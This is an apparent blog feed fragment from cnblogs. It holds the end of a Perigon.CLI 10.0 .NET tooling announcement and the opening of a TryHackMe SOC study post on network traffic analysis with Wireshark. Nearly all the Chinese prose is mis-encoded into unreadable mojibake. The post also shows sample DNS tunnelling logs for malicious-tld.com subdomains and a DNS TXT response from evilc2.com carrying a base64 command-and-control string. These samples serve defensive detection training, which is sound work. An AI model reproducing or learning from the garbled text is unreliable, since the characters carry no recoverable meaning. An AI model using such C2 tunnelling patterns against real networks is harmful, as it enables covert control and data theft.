<li>å¤æå¡æ¯æï¼ç»ååä½åå¾®æå¡ï¼ä¸ä¸ªè§£å³æ¹æ¡é½æå®</li>
<li>å¤ç§æ·æ¯æï¼éè¿éç½®å¨åç§æ·åå¤ç§æ·é´åæ¢</li>
<li>å¤æ°æ®åºæ¯æï¼éè¿å·¥åæ¨¡å¼æ¯æå¤ç§æ°æ®åº</li>
<li>å¤è¯­è¨æ¯æï¼åç½®å¤è¯­è¨æ¯æï¼æ¹ä¾¿å½éå</li>
<li>MCPæ¯æï¼ç´æ¥å¨IDEä¸­è°ç¨å·¥å·çæä»£ç </li>
<li>æºä»£ç çæå¨æ¯æ(å¤è¯­è¨åèªå¨æ³¨å¥Manager)</li>
</ul>
</li>
</ul>
<p>æ´ä¸ºéè¦çæ¯ï¼æ°çæ¬ç¡®å®äºä¸äºæ ¸å¿è®¾è®¡ååï¼</p>
<ul>
<li>éç¨ä¸å¼æ¾ï¼ä¸ä¾æäºç¹å®è®¾è®¡æ¨¡å¼ææ¶æï¼ä¼åä½¿ç¨éç¨ä¸æççææ¯æ </li>
<li>ç®åæç¨ï¼ä¸å¼å¥æ°çè®¾è®¡æ¨¡å¼æçè®ºï¼éä½å­¦ä¹ ææ¬åå¿æºè´æ</li>
<li>ä»¥å¼åèä¸ºä¸­å¿ï¼æé«å¼åæçåä½¿ç¨ä½éªæ¯ä¸»è¦ç®æ </li>
</ul>
<p>ç°å¨ï¼ä½ å¯ä»¥éè¿æä»¬çð<a href="https://dusi.dev/docs/Perigon.html" target="_blank" rel="noopener nofollow">å®æ¹ææ¡£</a>ï¼äºè§£å¦ä½å®è£åä½¿ç¨<code>Perigon.CLI</code>ï¼å¹¶å¼å§ä½ çé«æå¼åä¹æï¼</p>
<h2 id="æªæ¥">ðæªæ¥</h2>
<p>æªæ¥å°å¨ä¸ä¸ªæ¹é¢æç»­æ¹è¿ï¼</p>
<ul>
<li>çäº§åãå¦ä»æä»¬éè¿IDEåä»£ç çæå¨é¿åéå¤æ§çå·¥ä½ãèä»å¹´ä½¿ç¨code agentç¼ç¨å·²ç»æ¯éå¸¸å¹³å¸¸çäºæï¼å¶è½ååæææ éå¤è¨ï¼è½ç¶è¿æäºå±éæ§ï¼ä½å¶è½åè¿å¨ä¸æ­æåãæä»¬ä¼å°æ´å¤AIç¼ç¨çå®è·µç»éªèå¥å°å·¥å·ä¸­ï¼è¿ä¸æ­¥æåå¼åæçåå¼åä½éªã</li>
<li>æ§è½ãå¨ä¿ææ¨¡æ¿æ¡æ¶ç¨³å®çåºç¡ä¸ï¼å°½å¯è½çæåæ§è½ï¼å®åæ§è½æ¹é¢çæä½³å®è·µ(ææ¡£è¯´æ)ã</li>
<li>çæãæä»¬å°åºäº<code>perigon</code>æå»ºæ´å¤çåå®¹ï¼å¦èº«ä»½éªè¯ç³»ç»ï¼AIAgentç³»ç»ç­ï¼ä¹å°±æ¯å¨åºç¡æ¡æ¶çåºç¡ä¸ï¼æä¾æ´å¤é¢åç¹å®åºæ¯çè§£å³æ¹æ¡ãæ­¤å¤ï¼è¿å°å°è¯å¯¹æ¨¡åè¿è¡æååååï¼è¿ä¸æ­¥æé«å¤ç¨æ§åå¯ç»´æ¤æ§ã</li>
</ul>
<h3 id="çæ¬è®¡å">çæ¬è®¡å</h3>
<p>å¯¹äº<code>Perigon.CLI</code>ï¼å®å°è·é<code>.NET</code>ççæ¬è¿­ä»£è¿è¡æ´æ°ï¼è®¡åæ¯å¹´åå¸ä¸ä¸ªå¤§çæ¬ï¼åæ°çæ¬ä¼åæ¶æ¯æä¸ä¸ä¸ªLTSçæ¬ï¼å¶æ°çæ¬åªæ¯æå½åLTSçæ¬ã</p>
<p>å¯¹äº``Perigon.templates<code>ï¼å®ä»</code>1.0.0`å¼å§ï¼ç±äºå®å½±åæ´ä¸ªé¡¹ç®çç»æåææ¯éåï¼æªæ¥ä¸»è¦ä¸æ³¨äºé®é¢ä¿®å¤åæ§è½æåãæ°çåè½ç¹æ§å°½å¯è½å¨ä¸æ¹åç°æç»æçåæä¸è¿è¡æ·»å ã</p>
<h2 id="ï¸ï¸ç¤¾åºåä¸">ðââï¸ââ¡ï¸ç¤¾åºåä¸</h2>
<p>å¦æä½ å¯¹.NETå¼åæå´è¶£ï¼å¹¶å¸æåä¸å°Perigon.CLIçå»ºè®¾ä¸­æ¥ï¼æ¬¢è¿è®¿é®æä»¬ç<a href="https://github.com/AterDev/Perigon.CLI" target="_blank" rel="noopener nofollow">GitHubä»åº</a>ï¼æäº¤ä½ çæ³æ³ãå»ºè®®æè´¡ç®ä»£ç ãæä»¬æå¾ä¸ä½ ä¸èµ·æé æ´å¥½çå¼åå·¥å·ï¼</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-01 15:19">2026-01-01 15:18</span>&nbsp;
<a href="https://www.cnblogs.com/msdeveloper">TypingLearn</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19430150);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19430150', targetLink: 'https://www.cnblogs.com/msdeveloper/p/19430150/perigon-10-announce', title: 'Perigon.CLI 10.0 éç£åå¸ãAspNetCoreå¼åæ¨¡æ¿åè¾å©å·¥å·ã' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ TryHackMe-SOC-Section 6ï¼ç½ç»æµéåæ ]]></title>
    <link>https://www.cnblogs.com/dhan/p/19429465</link>
    <guid>d39ee4c3ee3ef833c88550e4141f84b8</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/dhan/p/19429465" title="åå¸äº 2026-01-01 08:06">
    <span role="heading" aria-level="2">TryHackMe-SOC-Section 6ï¼ç½ç»æµéåæ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        å­¦ä¹ ç½ç»æµéåæçåºç¡ç¥è¯ï¼å¹¶äº²èº«ä½¿ç¨ Wireshark æ£æµåç§ç±»åçæ»å»ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p></p><div class="toc"><div class="toc-container-header">ç®å½</div><ul><li><a href="#section-6ç½ç»æµéåæ" rel="noopener nofollow">Section 6ï¼ç½ç»æµéåæ</a><ul><li><a href="#ç½ç»æµéåºç¡ç¥è¯" rel="noopener nofollow">ç½ç»æµéåºç¡ç¥è¯</a><ul><li><a href="#ä»ç»" rel="noopener nofollow">ä»ç»</a></li><li><a href="#ç½ç»æµéåæçç®çæ¯ä»ä¹" rel="noopener nofollow">ç½ç»æµéåæçç®çæ¯ä»ä¹ï¼</a><ul><li><a href="#æä»¬ä¸ºä»ä¹è¦åæç½ç»æµé" rel="noopener nofollow">æä»¬ä¸ºä»ä¹è¦åæç½ç»æµéï¼</a></li></ul></li><li><a href="#æä»¬å¯ä»¥è§å¯å°åªäºç½ç»æµé" rel="noopener nofollow">æä»¬å¯ä»¥è§å¯å°åªäºç½ç»æµéï¼</a></li><li><a href="#ç½ç»æµéæ¥æºåæµå" rel="noopener nofollow">ç½ç»æµéæ¥æºåæµå</a><ul><li><a href="#æ¥æº" rel="noopener nofollow">æ¥æº</a></li><li><a href="#æµé" rel="noopener nofollow">æµé</a></li><li><a href="#æµç¨ç¤ºä¾" rel="noopener nofollow">æµç¨ç¤ºä¾</a></li></ul></li><li><a href="#æä»¬å¦ä½è§å¯ç½ç»æµé" rel="noopener nofollow">æä»¬å¦ä½è§å¯ç½ç»æµé?</a><ul><li><a href="#æ¥å¿" rel="noopener nofollow">æ¥å¿</a></li><li><a href="#å®æ´æ°æ®åæè·" rel="noopener nofollow">å®æ´æ°æ®åæè·</a></li><li><a href="#ç½ç»ç»è®¡" rel="noopener nofollow">ç½ç»ç»è®¡</a></li></ul></li></ul></li><li><a href="#wiresharkåºç¡ç¥è¯" rel="noopener nofollow">Wiresharkï¼åºç¡ç¥è¯</a><ul><li><a href="#ä»ç»-1" rel="noopener nofollow">ä»ç»</a><ul><li><a href="#å­¦ä¹ ç®æ " rel="noopener nofollow">å­¦ä¹ ç®æ </a></li></ul></li><li><a href="#å·¥å·æè¿°" rel="noopener nofollow">å·¥å·æè¿°</a><ul><li><a href="#ç¨ä¾" rel="noopener nofollow">ç¨ä¾</a></li><li><a href="#å¾å½¢ç¨æ·çé¢åæ°æ®" rel="noopener nofollow">å¾å½¢ç¨æ·çé¢åæ°æ®</a></li><li><a href="#å è½½pcapæä»¶" rel="noopener nofollow">å è½½PCAPæä»¶</a></li><li><a href="#æ¶è²å" rel="noopener nofollow">æ¶è²å</a></li><li><a href="#äº¤éåæ¢" rel="noopener nofollow">äº¤éåæ¢</a></li><li><a href="#åå¹¶pcapæä»¶" rel="noopener nofollow">åå¹¶PCAPæä»¶</a></li><li><a href="#æ¥çæä»¶è¯¦æ" rel="noopener nofollow">æ¥çæä»¶è¯¦æ</a></li></ul></li><li><a href="#åè§£å" rel="noopener nofollow">åè§£å</a><ul><li><a href="#åè§£å-1" rel="noopener nofollow">åè§£å</a></li><li><a href="#æ°æ®åè¯¦æ" rel="noopener nofollow">æ°æ®åè¯¦æ</a></li></ul></li><li><a href="#æ°æ®åå¯¼èª" rel="noopener nofollow">æ°æ®åå¯¼èª</a><ul><li><a href="#æ°æ®åç¼å·" rel="noopener nofollow">æ°æ®åç¼å·</a></li><li><a href="#åå¾æ°æ®å" rel="noopener nofollow">åå¾æ°æ®å</a></li><li><a href="#æ¥æ¾æ°æ®å" rel="noopener nofollow">æ¥æ¾æ°æ®å</a></li><li><a href="#æ è®°å" rel="noopener nofollow">æ è®°å</a></li><li><a href="#æ°æ®åæ³¨é" rel="noopener nofollow">æ°æ®åæ³¨é</a></li><li><a href="#å¯¼åºæ°æ®å" rel="noopener nofollow">å¯¼åºæ°æ®å</a></li><li><a href="#å¯¼åºå¯¹è±¡æä»¶" rel="noopener nofollow">å¯¼åºå¯¹è±¡ï¼æä»¶ï¼</a></li><li><a href="#æ¶é´æ¾ç¤ºæ ¼å¼" rel="noopener nofollow">æ¶é´æ¾ç¤ºæ ¼å¼</a></li><li><a href="#ä¸å®¶ä¿¡æ¯" rel="noopener nofollow">ä¸å®¶ä¿¡æ¯</a></li></ul></li><li><a href="#æ°æ®åè¿æ»¤" rel="noopener nofollow">æ°æ®åè¿æ»¤</a><ul><li><a href="#æ°æ®åè¿æ»¤-1" rel="noopener nofollow">æ°æ®åè¿æ»¤</a></li><li><a href="#åºç¨ä¸ºç­éå¨" rel="noopener nofollow">åºç¨ä¸ºç­éå¨</a></li><li><a href="#å¯¹è¯è¿æ»¤å¨" rel="noopener nofollow">å¯¹è¯è¿æ»¤å¨</a></li><li><a href="#ä¸ºå¯¹è¯çè²" rel="noopener nofollow">ä¸ºå¯¹è¯çè²</a></li><li><a href="#åå¤ä½ä¸ºè¿æ»¤å¨" rel="noopener nofollow">åå¤ä½ä¸ºè¿æ»¤å¨</a></li><li><a href="#ä½ä¸ºååºç¨" rel="noopener nofollow">ä½ä¸ºååºç¨</a></li><li><a href="#è·è¸ªæµ" rel="noopener nofollow">è·è¸ªæµ</a></li></ul></li></ul></li><li><a href="#wiresharkæ°æ®åæä½" rel="noopener nofollow">Wiresharkï¼æ°æ®åæä½</a><ul><li><a href="#ä»ç»-2" rel="noopener nofollow">ä»ç»</a></li><li><a href="#ç»è®¡æ°æ®--æè¦" rel="noopener nofollow">ç»è®¡æ°æ® | æè¦</a><ul><li><a href="#ç»è®¡æ°æ®" rel="noopener nofollow">ç»è®¡æ°æ®</a></li><li><a href="#å·²è§£æå°å" rel="noopener nofollow">å·²è§£æå°å</a></li><li><a href="#åè®®å±æ¬¡ç»æ" rel="noopener nofollow">åè®®å±æ¬¡ç»æ</a></li><li><a href="#ä¼è¯" rel="noopener nofollow">ä¼è¯</a></li><li><a href="#ç»ç¹" rel="noopener nofollow">ç»ç¹</a></li></ul></li><li><a href="#ç»è®¡æ°æ®--åè®®è¯¦æ" rel="noopener nofollow">ç»è®¡æ°æ® | åè®®è¯¦æ</a><ul><li><a href="#ipv4-å-ipv6" rel="noopener nofollow">IPv4 å IPv6</a></li><li><a href="#dns" rel="noopener nofollow">DNS</a></li><li><a href="#http" rel="noopener nofollow">HTTP</a></li></ul></li><li><a href="#æ°æ®åè¿æ»¤--åç" rel="noopener nofollow">æ°æ®åè¿æ»¤ | åç</a><ul><li><a href="#æè·è¿æ»¤å¨è¯­æ³" rel="noopener nofollow">æè·è¿æ»¤å¨è¯­æ³</a></li><li><a href="#æ¾ç¤ºç­éè¯­æ³" rel="noopener nofollow">æ¾ç¤ºç­éè¯­æ³</a></li><li><a href="#æ¯è¾è¿ç®ç¬¦" rel="noopener nofollow">æ¯è¾è¿ç®ç¬¦</a></li><li><a href="#é»è¾è¡¨è¾¾å¼" rel="noopener nofollow">é»è¾è¡¨è¾¾å¼</a></li><li><a href="#æ°æ®åè¿æ»¤å·¥å·æ " rel="noopener nofollow">æ°æ®åè¿æ»¤å·¥å·æ </a></li></ul></li><li><a href="#æ°æ®åè¿æ»¤--åè®®è¿æ»¤å¨" rel="noopener nofollow">æ°æ®åè¿æ»¤ | åè®®è¿æ»¤å¨</a><ul><li><a href="#ipè¿æ»¤å¨" rel="noopener nofollow">IPè¿æ»¤å¨</a></li><li><a href="#tcp-å-udp-è¿æ»¤å¨" rel="noopener nofollow">TCP å UDP è¿æ»¤å¨</a></li><li><a href="#åºç¨å±åè®®è¿æ»¤å¨--http-å-dns" rel="noopener nofollow">åºç¨å±åè®®è¿æ»¤å¨ | HTTP å DNS</a></li><li><a href="#æ¾ç¤ºç­éè¡¨è¾¾å¼" rel="noopener nofollow">æ¾ç¤ºç­éè¡¨è¾¾å¼</a></li></ul></li><li><a href="#é«çº§ç­é" rel="noopener nofollow">é«çº§ç­é</a><ul><li><a href="#ç­éæ¡ä»¶åå«" rel="noopener nofollow">ç­éæ¡ä»¶ï¼âåå«â</a></li><li><a href="#ç­éæ¡ä»¶å¹é" rel="noopener nofollow">ç­éæ¡ä»¶ï¼âå¹éâ</a></li><li><a href="#ç­éæ¡ä»¶in" rel="noopener nofollow">ç­éæ¡ä»¶ï¼âinâ</a></li><li><a href="#ç­éæ¡ä»¶å¤§å" rel="noopener nofollow">ç­éæ¡ä»¶ï¼âå¤§åâ</a></li></ul></li><li><a href="#ç­éæ¡ä»¶å°å" rel="noopener nofollow">ç­éæ¡ä»¶ï¼âå°åâ</a><ul><li><a href="#ç­éæ¡ä»¶è½¬å­ç¬¦ä¸²å¹é" rel="noopener nofollow">ç­éæ¡ä»¶ï¼âè½¬å­ç¬¦ä¸²å¹éâ</a></li><li><a href="#ä¹¦ç­¾åç­éæé®" rel="noopener nofollow">ä¹¦ç­¾åç­éæé®</a></li><li><a href="#ç®ä»" rel="noopener nofollow">ç®ä»</a></li></ul></li></ul></li><li><a href="#wiresharkæµéåæ" rel="noopener nofollow">Wiresharkï¼æµéåæ</a><ul><li><a href="#nmapæ«æ" rel="noopener nofollow">Nmapæ«æ</a><ul><li><a href="#tcpè¿æ¥æ«æ" rel="noopener nofollow">TCPè¿æ¥æ«æ</a></li><li><a href="#åæ­¥æ«æ" rel="noopener nofollow">åæ­¥æ«æ</a></li><li><a href="#udpæ«æ" rel="noopener nofollow">UDPæ«æ</a></li></ul></li><li><a href="#arpææ¯æ»å»åä¸­é´äººæ»å»" rel="noopener nofollow">ARPææ¯æ»å»åä¸­é´äººæ»å»ï¼</a><ul><li><a href="#arpæ¬ºéªä¸­åæ»å»åç§°ä¸­é´äººæ»å»" rel="noopener nofollow">ARPæ¬ºéª/ä¸­åæ»å»ï¼åç§°ä¸­é´äººæ»å»ï¼</a></li></ul></li><li><a href="#ä¸»æºè¯å«dhcpnetbios-å-kerberos" rel="noopener nofollow">ä¸»æºè¯å«ï¼DHCPãNetBIOS å Kerberos</a><ul><li><a href="#è¯å«å®¿ä¸»" rel="noopener nofollow">è¯å«å®¿ä¸»</a></li><li><a href="#dhcpåæ" rel="noopener nofollow">DHCPåæ</a></li><li><a href="#netbios-nbns-åæ" rel="noopener nofollow">NetBIOS (NBNS) åæ</a></li><li><a href="#kerberos-åæ" rel="noopener nofollow">Kerberos åæ</a></li></ul></li><li><a href="#é§éæµédns-å-icmp" rel="noopener nofollow">é§éæµéï¼DNS å ICMP</a><ul><li><a href="#icmpåæ" rel="noopener nofollow">ICMPåæ</a></li><li><a href="#dns-åæ" rel="noopener nofollow">DNS åæ</a></li></ul></li><li><a href="#ææåè®®åæftp" rel="noopener nofollow">ææåè®®åæï¼FTP</a><ul><li><a href="#ftpåæ" rel="noopener nofollow">FTPåæ</a></li></ul></li><li><a href="#ææåè®®åæhttp" rel="noopener nofollow">ææåè®®åæï¼HTTP</a><ul><li><a href="#ç¨æ·ä»£çåæ" rel="noopener nofollow">ç¨æ·ä»£çåæ</a></li><li><a href="#log4j-åæ" rel="noopener nofollow">Log4j åæ</a></li></ul></li><li><a href="#å å¯åè®®åæè§£å¯-https" rel="noopener nofollow">å å¯åè®®åæï¼è§£å¯ HTTPS</a></li><li><a href="#å¥å±å¯»æ¾ææå­è¯" rel="noopener nofollow">å¥å±ï¼å¯»æ¾ææå­è¯ï¼</a></li><li><a href="#é¢å¤ç¦å©å¯æ§è¡çç»æ" rel="noopener nofollow">é¢å¤ç¦å©ï¼å¯æ§è¡çç»æï¼</a></li><li><a href="#ç»è®º" rel="noopener nofollow">ç»è®º</a></li></ul></li><li><a href="#ç½ç»ç¿å·¥" rel="noopener nofollow">ç½ç»ç¿å·¥</a><ul><li><a href="#ä»ç»-3" rel="noopener nofollow">ä»ç»</a></li><li><a href="#networkminer-å¨åè¯ä¸­çåºç¨" rel="noopener nofollow">NetworkMiner å¨åè¯ä¸­çåºç¨</a><ul><li><a href="#ç½ç»ææå¨åè¯ä¸­çåºç¨" rel="noopener nofollow">ç½ç»ææå¨åè¯ä¸­çåºç¨</a></li><li><a href="#æ¯æçæ°æ®ç±»å" rel="noopener nofollow">æ¯æçæ°æ®ç±»å</a></li></ul></li><li><a href="#networkmineræ¯ä»ä¹" rel="noopener nofollow">NetworkMineræ¯ä»ä¹ï¼</a><ul><li><a href="#networkminer-ç®ä»" rel="noopener nofollow">NetworkMiner ç®ä»</a></li><li><a href="#æä½æ¨¡å¼" rel="noopener nofollow">æä½æ¨¡å¼</a></li><li><a href="#ä¼ç¹åç¼ºç¹" rel="noopener nofollow">ä¼ç¹åç¼ºç¹</a></li><li><a href="#wireshark-å-networkminer-çåºå«" rel="noopener nofollow">Wireshark å NetworkMiner çåºå«</a></li></ul></li><li><a href="#å·¥å·æ¦è¿°-1" rel="noopener nofollow">å·¥å·æ¦è¿° 1</a><ul><li><a href="#é¦é¡µ" rel="noopener nofollow">é¦é¡µ</a></li><li><a href="#æä»¶èå" rel="noopener nofollow">æä»¶èå</a></li><li><a href="#å·¥å·èå" rel="noopener nofollow">å·¥å·èå</a></li><li><a href="#å¸®å©èå" rel="noopener nofollow">å¸®å©èå</a></li><li><a href="#æºç®±é¢æ¿" rel="noopener nofollow">æºç®±é¢æ¿</a></li><li><a href="#ä¸»æº" rel="noopener nofollow">ä¸»æº</a></li><li><a href="#ä¼è¯-1" rel="noopener nofollow">ä¼è¯</a></li><li><a href="#dns-1" rel="noopener nofollow">DNS</a></li><li><a href="#è¯ä¹¦" rel="noopener nofollow">è¯ä¹¦</a></li></ul></li><li><a href="#å·¥å·æ¦è¿°-2" rel="noopener nofollow">å·¥å·æ¦è¿° 2</a><ul><li><a href="#æä»¶" rel="noopener nofollow">æä»¶</a></li><li><a href="#å¾ç" rel="noopener nofollow">å¾ç</a></li><li><a href="#åæ°" rel="noopener nofollow">åæ°</a></li><li><a href="#å³é®è¯keyword" rel="noopener nofollow">å³é®è¯(keyword)</a></li><li><a href="#æ¶æ¯" rel="noopener nofollow">æ¶æ¯</a></li><li><a href="#å¼å¸¸" rel="noopener nofollow">å¼å¸¸</a></li></ul></li><li><a href="#çæ¬å·®å¼" rel="noopener nofollow">çæ¬å·®å¼</a><ul><li><a href="#macå°åå¤ç" rel="noopener nofollow">MACå°åå¤ç</a></li><li><a href="#å¸§å¤ç" rel="noopener nofollow">å¸§å¤ç</a></li><li><a href="#åæ°å¤ç" rel="noopener nofollow">åæ°å¤ç</a></li></ul></li><li><a href="#ç»ä¹ " rel="noopener nofollow">ç»ä¹ </a></li></ul></li></ul></li></ul></div><p></p>
<h2 id="section-6ç½ç»æµéåæ">Section 6ï¼ç½ç»æµéåæ</h2>
<h3 id="ç½ç»æµéåºç¡ç¥è¯">ç½ç»æµéåºç¡ç¥è¯</h3>
<p>äºè§£ä»ä¹æ¯ç½ç»åæãä¸ºä»ä¹å®è³å³éè¦ãå¦ä½æ¶éç½ç»æµéä»¥åæåªäºå·¥å·å¯ç¨ã</p>
<h4 id="ä»ç»">ä»ç»</h4>
<p>ç½ç»æµéåæ ( NTA ) æ¯ä¸ä¸ªæ¶µçæè·ãæ£æ¥ååæç½ç»ä¸­æ°æ®æµçè¿ç¨ãå¶ç®æ æ¯å¨é¢äºè§£ç½ç»åå¤éä¿¡çåå®¹ãéè¦å¼ºè°çæ¯ï¼NTAå¹¶é Wireshark å·¥å·çåä¹è¯ãå®è¿ä¸æ­¢äºæ­¤ï¼NTA ç»åäºå¤ç§æ¥å¿ãæ·±åº¦åæ£æµåç½ç»æµéç»è®¡ä¿¡æ¯ï¼å¹¶éå¯¹ç¹å®çç®æ ï¼æä»¬å°å¨åæè®¨è®ºï¼è¿è¡å³èåæã</p>
<p>ææ¡ç½ç»æµéåææè½è³å³éè¦ï¼è¿ä¸ä»å¯¹æå¿æä¸ºå®å¨è¿è¥ä¸­å¿ (SOC)ä¸çº§åæå¸çäººæ¥è¯´å¦æ­¤ï¼å¯¹èéåçº¢éä¸­çè®¸å¤å¶ä»è§è²ä¹åæ ·éè¦ãä½ä¸ºä¸åä¸çº§åæå¸ï¼ä½ éè¦è½å¤ä»æµ·éçç½ç»ä¿¡æ¯ä¸­çæ¸å¤´ç»ªï¼åè¾¨åªäºæ¯æ­£å¸¸æåµï¼åªäºæ¯åç¦»åºåçº¿çæåµã</p>
<p>å¨è¿ä¸ªæ¿é´éï¼æä»¬å°éç¹è®¨è®ºç½ç»æµéåæçå®ä¹ãä¸ºä»ä¹éè¦å®ãå¦ä½è§å¯ç½ç»æµéä»¥åéè¦æ³¨æçä¸äºç½ç»æµéæ¥æºåæµåã</p>
<ul>
<li>å­¦ä¹ ç®æ 
<ul>
<li>äºè§£ä»ä¹æ¯ç½ç»æµéåæ</li>
<li>äºè§£å¯ä»¥è§å¯å°ä»ä¹</li>
<li>äºè§£å¦ä½çæ§ç½ç»æµé</li>
<li>äºè§£å¸åçç½ç»æµéæ¥æºåæµ</li>
</ul>
</li>
</ul>
<h4 id="ç½ç»æµéåæçç®çæ¯ä»ä¹">ç½ç»æµéåæçç®çæ¯ä»ä¹ï¼</h4>
<p>æä»¬ä¸ºä»ä¹è¦åæç½ç»æµéï¼å¨åç­è¿ä¸ªé®é¢ä¹åï¼è®©æä»¬åæ¥çä¸é¢çåºæ¯ã</p>
<p><strong>DNSé§éåä¿¡æ </strong><br>
æ¨æ¯ä¸åSOCåæå¸ï¼æ¶å°ä¸æ¡è­¦æ¥ï¼æåºæ¥èªåä¸ºWIN-016ãIPå°åä¸º192.168.1.16çä¸»æºçDNSæ¥è¯¢æ°éå¼å¸¸å¢å¤ãé²ç«å¢ä¸çDNSæ¥å¿æ¾ç¤ºï¼å¤ä¸ªDNSæ¥è¯¢åå¾åä¸ä¸ªé¡¶çº§ååï¼TLDï¼ï¼æ¯æ¬¡é½ä½¿ç¨ä¸åçå­ååã</p>
<pre><code class="language-bash">2025-10-03 09:15:23    SRC=192.168.1.16      QUERY=aj39skdm.malicious-tld.com    QTYPE=A      
2025-10-03 09:15:31    SRC=192.168.1.16      QUERY=msd91azx.malicious-tld.com    QTYPE=A     
2025-10-03 09:15:45    SRC=192.168.1.16      QUERY=cmd01.malicious-tld.com       QTYPE=TXT     
2025-10-03 09:15:45    SRC=192.168.1.16      QUERY=cmd01.malicious-tld.com       QTYPE=TXT     
</code></pre>
<p>æ ¹æ® DNS æ¥å¿ï¼æä»¬å¯ä»¥æ£ç´¢å°ä»¥ä¸ä¿¡æ¯ï¼</p>
<ul>
<li>æ¥è¯¢åæ¥è¯¢ç±»å</li>
<li>å­åååé¡¶çº§ååï¼æä»¬å¯ä»¥ä½¿ç¨ abuseDB æ VirusTotal ç­å·¥å·æ¥æ£æ¥ååæ¯å¦æ¶æã</li>
<li>ä¸»æº IPï¼æä»¬å¯ä»¥è¯å«ååº DNS æ¥è¯¢çç³»ç»ã</li>
<li>ç®æ  IPï¼æä»¬å¯ä»¥ä½¿ç¨ <a href="https://www.abuseipdb.com/" target="_blank" rel="noopener nofollow">AbuseIPDB</a>æ<a href="https://virustotal.com/" target="_blank" rel="noopener nofollow">VirusTotal</a>ç­å·¥å·æ¥éªè¯è¯¥ IP æ¯å¦è¢«æ è®°ä¸ºæ¶æ IPã</li>
<li>æ¶é´æ³ï¼æä»¬å¯ä»¥æå»ºä¸ä¸ªæ¶é´çº¿ï¼è®°å½ä¸ä¸åçå¯çæ¥è¯¢ã</li>
</ul>
<p>DNS æ¥å¿åå«çä¿¡æ¯ä»éäºæ­¤ï¼å æ­¤ä»å­è¿äºä¿¡æ¯å¾é¾å¾åºç»è®ºãæä»¬éè¦æ´å½»åºå°æ£æ¥ DNS æµéï¼å¹¶æ ¸å¯¹ DNS æ¥è¯¢åååºçåå®¹ãè¿å°æå©äºæä»¬ç¡®å®è¿äºæ¥è¯¢åååºçæ§è´¨ã</p>
<p>è¿ç§æåµååè¯´æäºä¸ºä»ä¹æä»¬éè¦ç½ç»æµéåæãé²ç«å¢åå¶ä»è®¾å¤ä¼è®°å½ DNS æ¥è¯¢åå¶ååºï¼ä½ä¸ä¼è®°å½å¶åå®¹ãä¾å¦ï¼æ»å»èå¯ä»¥å©ç¨ TXT è®°å½ååææçç³»ç»åéå½ä»¤ä¸æ§å¶ (C2) æä»¤ãæä»¬å¯ä»¥éè¿æ£æ¥ DNS æ¥è¯¢çåå®¹æ¥åç°è¿ä¸ç¹ãä¸é¢çæ°æ®åæè·çæ®µæ¾ç¤ºäºä¸ä¸ªåå« C2 å½ä»¤ç DNS ååºçåå®¹ã</p>
<pre><code class="language-json">Domain Name System (response)
    Transaction ID: 0x4a2b
    Flags: 0x8180 Standard query response, No error
        1... .... .... .... = Response: Message is a response
        .... .... .... 0000 = RCODE: No error (0)
    Questions: 1
    Answer RRs: 1
    Authority RRs: 0
    Additional RRs: 0
    Queries
        cmd1.evilc2.com: type TXT, class IN
    Answers
        cmd1.evilc2.com: type TXT, class IN, TTL 60, TXT length: 20
            TXT: "SSBsb3ZlIHlvdXIgY3VyaW91c2l0eQ=="
</code></pre>
<h5 id="æä»¬ä¸ºä»ä¹è¦åæç½ç»æµé">æä»¬ä¸ºä»ä¹è¦åæç½ç»æµéï¼</h5>
<p>éå¸¸ï¼æä»¬ä¼å©ç¨ç½ç»æµéåææ¥ï¼</p>
<ul>
<li>çæ§ç½ç»æ§è½</li>
<li>æ£æ¥ç½ç»æ¯å¦å­å¨å¼å¸¸æåµï¼ä¾å¦ï¼æ§è½çªç¶é£åãç½ç»éåº¦åæ¢ç­ã</li>
<li>æ£æ¥åé¨åå¤é¨å¯çéä¿¡çåå®¹ãä¾å¦ï¼éè¿DNSè¿è¡æ°æ®æ³é²ãéè¿HTTPä¸è½½æ¶æ ZIP æä»¶ãæ¨ªåç§»å¨ç­ã</li>
</ul>
<p>ä»å®å¨è¿è¥ä¸­å¿ï¼SOCï¼çè§åº¦æ¥çï¼ç½ç»æµéåææå©äºï¼</p>
<ul>
<li>æ£æµå¯çææ¶ææ´»å¨</li>
<li>äºä»¶ååºæé´çæ»å»éå»º</li>
<li>éªè¯åç¡®è®¤è­¦æ¥</li>
</ul>
<p>ä»¥ä¸ä¸¤ä¸ªåºæ¯è¿ä¸æ­¥è¯´æäºç½ç»æµéåæçéè¦æ§ï¼</p>
<ul>
<li>æ ¹æ®ç»ç«¯ç¨æ·ç³»ç»çæ¥å¿ï¼è¯¥ç³»ç»å¨ä¸çåè°æ¶ä¸å 4 ç¹å·¦å³å¼å§åºç°å¼å¸¸è¡ä¸ºãéè¿åæè¿åºè¯¥ç³»ç»çç½ç»æµéï¼æä»¬åç°äºä¸ä¸ªå¯ççHTTPè¯·æ±ï¼å¹¶æåæååºäºä¸ä¸ªå¯çç ZIP æä»¶ã</li>
<li>æä»¬æ¶å°è­¦æ¥ï¼æ¾ç¤ºæä¸ªç»ç«¯ç¨æ·ç³»ç»åéçDNSè¯·æ±æ°éè¿è¶ç½ç»åºçº¿æ°´å¹³ãç»æ£æ¥ï¼æä»¬åç°æäººå©ç¨ä¸ç§åä¸ºDNSé§éçææ¯çªåæ°æ®ã</li>
</ul>
<p>æ¢ç¶æä»¬ç¥éäº<strong>ä¸ºä»ä¹</strong>éè¦ç½ç»æµéåæï¼æ¥ä¸æ¥è®©æä»¬ç»§ç»­ä¸ä¸ä¸ªä»»å¡ï¼ççæä»¬ç©¶ç«å¯ä»¥çæ§<strong>ä»ä¹</strong>ã</p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢ã<br>
